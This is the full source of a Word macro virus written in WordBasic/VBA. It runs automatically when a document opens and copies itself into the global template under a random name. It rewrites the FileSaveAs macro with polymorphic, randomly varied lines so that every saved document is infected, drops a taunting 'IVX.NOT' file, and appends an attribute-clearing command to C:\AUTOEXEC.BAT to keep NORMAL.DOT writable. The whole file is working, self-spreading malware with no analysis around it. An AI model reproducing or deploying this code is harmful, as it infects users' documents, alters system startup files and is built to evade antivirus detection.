   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim M
   Dim i
   Dim b
   Dim jqp$
   Dim q
   Dim w$
   Dim x
   Dim iv$
   Dim nd$
   Dim y$
   Dim r
   On Error GoTo -1: On Error GoTo Abort
   M = WordBasic.CountMacros(0, 0)
   For i = 1 To M
   If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then b = -1
   Next i
   If Not b Then
   WordBasic.DisableInput
   WordBasic.ToolsOptionsSave FastSaves:=1, GlobalDotPrompt:=0
   WordBasic.ScreenUpdating 0
   jqp$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy jqp$ + ":AutoOpen", "Global:GGMZW"
   WordBasic.ToolsMacro Name:="GGMZW", Edit:=1, Show:=0
   For q = 1 To 5
   w$ = w$ + Chr(WordBasic.Int(Rnd() * 26) + 65)
   Next q
   WordBasic.EditReplace Find:="GGMZW", Replace:=w$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1
   w$ = ""
   For q = 1 To 3
   w$ = w$ + Chr(WordBasic.Int(Rnd() * 26) + 97)
   Next q
   w$ = w$ + "$"
   WordBasic.EditReplace Find:="jqp$", Replace:=w$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1
   WordBasic.ParaDown WordBasic.Int(Rnd() * 50) + 1
   WordBasic.Insert "'1 Gen"
   WordBasic.InsertPara
   WordBasic.DocClose 1
   WordBasic.ToolsMacro Name:="FileSaveAs", Edit:=1, Show:=0
   WordBasic.StartOfLine
   '1 Gen
   WordBasic.LineUp 1
   WordBasic.Insert "on error goto abort"
   WordBasic.InsertPara
   WordBasic.LineDown 1
   x = Rnd()
   If x < 0.2 Then
   WordBasic.Insert "dlg.format=1"
   ElseIf x < 0.4 Then
   WordBasic.Insert "dlg.format = 1"
   ElseIf x < 0.6 Then
   WordBasic.Insert "dlg. format =1"
   ElseIf x < 0.8 Then
   WordBasic.Insert " dlg.format=1"
   Else
   WordBasic.Insert "dlg.format =1"
   End If
   WordBasic.InsertPara
   WordBasic.Insert "'" + Str(Rnd())
   WordBasic.InsertPara
   x = Rnd()
   If x < 0.2 Then
   WordBasic.Insert "jqp$=filename$()"
   ElseIf x < 0.4 Then
   WordBasic.Insert " jqp$   =  filename$()"
   ElseIf x < 0.4 Then
   WordBasic.Insert " jqp$ = filename$()"
   ElseIf x < 0.4 Then
   WordBasic.Insert "   jqp$ =filename$()"
   Else
   WordBasic.Insert "jqp$   =filename$()"
   End If
   x = WordBasic.Int(Rnd() * 5) + 2
   For i = 1 To x
   WordBasic.InsertPara
   Next i
   WordBasic.Insert "'" + Str(Rnd())
   WordBasic.InsertPara
   WordBasic.Insert "macrocopy " + Chr(34) + "Global:GGMZW" + Chr(34) + ",jqp$+" + Chr(34) + ":AutoOpen" + Chr(34)
   WordBasic.InsertPara
   WordBasic.LineDown 1
   WordBasic.Insert "abort:"
   WordBasic.InsertPara
   WordBasic.DocClose 1
   iv$ = WordBasic.[FileNameInfo$](jqp$, 5) + "IVX.NOT"
   Open iv$ For Output As 1
   Print #1, "IVX detects all macro viruses, past, present, and future."
   Close 1
   nd$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"
   Open "C:\AUTOEXEC.BAT" For Input As 1
   While Not EOF(1)
   Line Input #1, y$
   If InStr(y$, nd$) <> 0 Then r = -1
   Wend
   Close 1
   If Not r Then
   Open "C:\AUTOEXEC.BAT" For Append As 1
   Print #1, "@ATTRIB -R " + nd$ + " > NUL"
   Close 1
   End If
   End If
   Abort:
   End Sub
